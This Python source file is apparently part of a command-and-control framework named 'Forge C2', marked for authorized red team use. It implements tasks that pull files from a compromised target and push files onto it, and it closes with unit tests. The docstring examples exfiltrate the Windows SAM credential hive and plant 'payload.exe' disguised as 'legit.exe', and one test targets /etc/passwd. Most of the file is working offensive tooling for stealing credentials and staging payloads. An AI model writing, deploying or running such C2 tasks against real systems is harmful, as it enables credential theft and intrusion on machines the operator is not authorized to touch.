"""
Forge C2 — File Transfer Tasks (Download + Upload)
=====================================================
Download files FROM the target, upload files TO the target.

Both tasks handle:
    • Large file chunking
    • Base64 encoding for transport
    • Path validation
    • Metadata collection (size, hash, timestamps)

FOR AUTHORIZED RED TEAM OPERATIONS ONLY.
"""
from __future__ import annotations

import asyncio
import base64
import hashlib
import logging
import os
import time
from pathlib import Path
from typing import Any

from forge_c2.tasks.base_task import (
    BaseTask, TaskResult, TaskStatus, register_task,
)

log = logging.getLogger("forge.c2.tasks.file")

MAX_FILE_SIZE = 100 * 1024 * 1024  # 100MB transfer limit


@register_task
class DownloadTask(BaseTask):
    """Download a file from the target system.

    Reads the file, base64-encodes it, and ships it back as
    TaskResult.data. Server-side storage is handled by the
    team server.

    Args (via kwargs):
        path:       Remote file path to download.
        chunk_size: Max bytes per chunk (0 = send entire file).

    Usage::

        task = DownloadTask(task_id="d1", path="C:\\\\Windows\\\\System32\\\\config\\\\SAM")
        result = await task.execute()
        # result.data = raw file bytes
        # result.metadata has size, hash, etc.
    """

    TASK_TYPE = "download"
    DESCRIPTION = "Download file from target"
    OPSEC_RISK = "medium"

    async def execute(self) -> TaskResult:
        file_path = self.args.get("path", "")
        if not file_path:
            return TaskResult(
                task_id=self.task_id,
                status=TaskStatus.FAILED,
                error="No file path specified",
            )

        start = time.time()

        try:
            path = Path(file_path)

            if not path.exists():
                return TaskResult(
                    task_id=self.task_id,
                    status=TaskStatus.FAILED,
                    error=f"File not found: {file_path}",
                    started_at=start,
                )

            if not path.is_file():
                return TaskResult(
                    task_id=self.task_id,
                    status=TaskStatus.FAILED,
                    error=f"Not a file: {file_path}",
                    started_at=start,
                )

            file_size = path.stat().st_size
            if file_size > MAX_FILE_SIZE:
                return TaskResult(
                    task_id=self.task_id,
                    status=TaskStatus.FAILED,
                    error=f"File too large: {file_size} bytes (max {MAX_FILE_SIZE})",
                    started_at=start,
                )

            # Read the file
            data = await asyncio.get_event_loop().run_in_executor(
                None, path.read_bytes,
            )

            # Calculate hash
            file_hash = hashlib.sha256(data).hexdigest()

            return TaskResult(
                task_id=self.task_id,
                status=TaskStatus.COMPLETED,
                output=f"Downloaded {file_path} ({file_size} bytes, SHA256={file_hash[:16]}...)",
                data=data,
                started_at=start,
                completed_at=time.time(),
                metadata={
                    "path": str(path.absolute()),
                    "filename": path.name,
                    "size": file_size,
                    "sha256": file_hash,
                    "modified": path.stat().st_mtime,
                },
            )

        except PermissionError:
            return TaskResult(
                task_id=self.task_id,
                status=TaskStatus.FAILED,
                error=f"Permission denied: {file_path}",
                started_at=start,
                completed_at=time.time(),
            )
        except Exception as exc:
            return TaskResult(
                task_id=self.task_id,
                status=TaskStatus.FAILED,
                error=str(exc),
                started_at=start,
                completed_at=time.time(),
            )


@register_task
class UploadTask(BaseTask):
    """Upload a file to the target system.

    Receives base64-encoded file data and writes it to the
    specified path on the target.

    Args (via kwargs):
        path:    Destination path on target.
        data:    Base64-encoded file contents.
        mode:    File permission mode (Unix, default "0644").
        append:  If True, append instead of overwrite.

    Usage::

        with open("payload.exe", "rb") as f:
            b64_data = base64.b64encode(f.read()).decode()

        task = UploadTask(
            task_id="u1",
            path="C:\\\\Temp\\\\legit.exe",
            data=b64_data,
        )
        result = await task.execute()
    """

    TASK_TYPE = "upload"
    DESCRIPTION = "Upload file to target"
    OPSEC_RISK = "high"

    async def execute(self) -> TaskResult:
        dest_path = self.args.get("path", "")
        b64_data = self.args.get("data", "")
        append = self.args.get("append", False)

        if not dest_path:
            return TaskResult(
                task_id=self.task_id,
                status=TaskStatus.FAILED,
                error="No destination path specified",
            )

        if not b64_data:
            return TaskResult(
                task_id=self.task_id,
                status=TaskStatus.FAILED,
                error="No file data provided",
            )

        start = time.time()

        try:
            # Decode the data
            file_data = base64.b64decode(b64_data)
            file_hash = hashlib.sha256(file_data).hexdigest()

            if len(file_data) > MAX_FILE_SIZE:
                return TaskResult(
                    task_id=self.task_id,
                    status=TaskStatus.FAILED,
                    error=f"Data too large: {len(file_data)} bytes",
                    started_at=start,
                )

            path = Path(dest_path)

            # Create parent directories if needed
            path.parent.mkdir(parents=True, exist_ok=True)

            # Write the file
            mode = "ab" if append else "wb"
            await asyncio.get_event_loop().run_in_executor(
                None, lambda: path.open(mode).write(file_data),
            )

            return TaskResult(
                task_id=self.task_id,
                status=TaskStatus.COMPLETED,
                output=f"Uploaded to {dest_path} ({len(file_data)} bytes)",
                started_at=start,
                completed_at=time.time(),
                metadata={
                    "path": str(path.absolute()),
                    "size": len(file_data),
                    "sha256": file_hash,
                    "append": append,
                },
            )

        except PermissionError:
            return TaskResult(
                task_id=self.task_id,
                status=TaskStatus.FAILED,
                error=f"Permission denied: {dest_path}",
                started_at=start,
                completed_at=time.time(),
            )
        except Exception as exc:
            return TaskResult(
                task_id=self.task_id,
                status=TaskStatus.FAILED,
                error=str(exc),
                started_at=start,
                completed_at=time.time(),
            )


# ══════════════════════════════════════════════════════════════════════
#  UNIT TESTS
# ══════════════════════════════════════════════════════════════════════

class TestDownloadTask:
    """Tests for download task."""

    def test_encode(self) -> None:
        task = DownloadTask(task_id="d1", path="/etc/passwd")
        encoded = task.encode()
        assert encoded["type"] == "download"
        assert encoded["args"]["path"] == "/etc/passwd"

    def test_no_path(self) -> None:
        import asyncio
        task = DownloadTask(task_id="d2")
        result = asyncio.get_event_loop().run_until_complete(task.execute())
        assert result.status == TaskStatus.FAILED

    def test_file_not_found(self) -> None:
        import asyncio
        task = DownloadTask(task_id="d3", path="/nonexistent/ghost/file.txt")
        result = asyncio.get_event_loop().run_until_complete(task.execute())
        assert result.status == TaskStatus.FAILED
        assert "not found" in result.error.lower()


class TestUploadTask:
    """Tests for upload task."""

    def test_encode(self) -> None:
        task = UploadTask(task_id="u1", path="/tmp/test.txt", data="aGVsbG8=")
        encoded = task.encode()
        assert encoded["type"] == "upload"

    def test_no_path(self) -> None:
        import asyncio
        task = UploadTask(task_id="u2", data="aGVsbG8=")
        result = asyncio.get_event_loop().run_until_complete(task.execute())
        assert result.status == TaskStatus.FAILED

    def test_no_data(self) -> None:
        import asyncio
        task = UploadTask(task_id="u3", path="/tmp/test.txt")
        result = asyncio.get_event_loop().run_until_complete(task.execute())
        assert result.status == TaskStatus.FAILED
